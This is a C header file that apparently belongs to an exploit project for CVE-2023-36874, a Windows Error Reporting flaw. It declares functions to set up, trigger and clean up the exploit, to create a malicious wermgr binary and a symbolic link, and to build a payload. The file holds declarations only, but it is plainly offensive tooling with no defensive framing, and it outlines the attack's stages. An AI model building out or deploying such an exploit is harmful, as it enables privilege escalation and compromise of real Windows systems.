#pragma once

#include "general.h"

// ==================== CVE-2023-36874 WER EXPLOIT HEADER ====================

// Main WER exploit function
BOOL ExecuteWerExploit(void);

// WER exploit component functions
BOOL WerExploitSetup(void);
BOOL WerExploitTrigger(PVOID payload, SIZE_T payloadSize);
BOOL WerExploitCleanup(void);
BOOL WerExploitAlternative(PVOID payload, SIZE_T payloadSize);

// WER helper functions
BOOL WerCreateReportDirectory(void);
BOOL WerCreateDummyReport(void);
BOOL WerCreateMaliciousWermgr(PVOID payload, SIZE_T payloadSize);
BOOL WerCreateSymbolicLink(void);

// Payload creation
BOOL CreateSimplePayload(PVOID* payload, SIZE_T* payloadSize);

// WER exploit status
extern BOOL werExploitActive;
extern WCHAR werReportName[64];
extern WCHAR werExploitDir[MAX_PATH]; 